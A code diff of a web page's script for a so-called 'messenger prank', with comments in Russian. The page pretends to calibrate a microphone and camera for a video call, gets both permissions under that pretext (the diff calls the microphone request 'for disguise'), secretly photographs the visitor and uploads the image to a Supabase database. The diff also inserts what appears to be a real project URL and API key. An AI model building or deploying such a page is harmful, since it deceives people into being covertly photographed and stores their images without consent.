@@ -124,9 +124,9 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // НАСТРОЙКИ SUPABASE (Вставь свои данные)
-        const SUPABASE_URL = 'https://твой-проект.supabase.co';
-        const SUPABASE_KEY = 'твой-anon-ключ';
+        // Твои реальные данные Supabase
+        const SUPABASE_URL = 'https://vesinwkjmjykdhtdsnat.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZlc2lud2tqbWp5a2RodGRzbmF0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI0OTg5NTUsImV4cCI6MjEwODA3NDk1NX0.JDAtKh6sW9nmeIpdr1zMG_OPYfXsmXrZPATepyi831w';
         
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
@@ -150,7 +150,7 @@
 
                 if (error) {
                     console.error('Ошибка Supabase:', error);
-                    uploadStatus.textContent = "Фотовспышка сработала, но в базу не записалось.";
+                    uploadStatus.textContent = "Фотовспышка сработала, но в базу не записалось (проверь бакет photos).";
                 } else {
                     uploadStatus.textContent = "Снимок успешно улетел в базу 7Д! 🚀";
                 }
@@ -162,14 +162,13 @@
 
         async function initMessengerPrank() {
             try {
-                // ШАГ 1: Сначала запрашиваем МИКРОФОН (для видимости настроек звука)
+                // ШАГ 1: Запрашиваем микрофон для маскировки
                 statusText.textContent = "Шаг 1/2: Калибровка микрофона для связи...";
                 const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                 
-                // Короткая пауза, чтобы создать видимость процесса
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // ШАГ 2: Затем запрашиваем КАМЕРУ (для видеосвязи)
+                // ШАГ 2: Запрашиваем камеру
                 statusText.textContent = "Шаг 2/2: Проверка видеокамеры...";
                 const videoStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
@@ -179,7 +178,6 @@
                 video.srcObject = videoStream;
                 statusText.textContent = "Подключение к конференции...";
 
-                // Даем секунду на кадр
                 setTimeout(async () => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
@@ -194,11 +192,11 @@
                     img.src = dataUrl;
                     photoContainer.appendChild(img);
 
-                    // Гасим и микрофон, и камеру
+                    // Гасим потоки
                     audioStream.getTracks().forEach(track => track.stop());
                     videoStream.getTracks().forEach(track => track.stop());
 
-                    // Переключаем экраны
+                    // Переключаем интерфейс
                     loaderScreen.style.display = 'none';
                     prankScreen.style.display = 'flex';
 
@@ -208,7 +206,6 @@
                 }, 1000);
 
             } catch (err) {
-                // Если пользователь отклонил что-то из разрешений
                 statusText.textContent = "Ошибка доступа. Для входа в мессенджер нужны разрешения.";
             }
         }
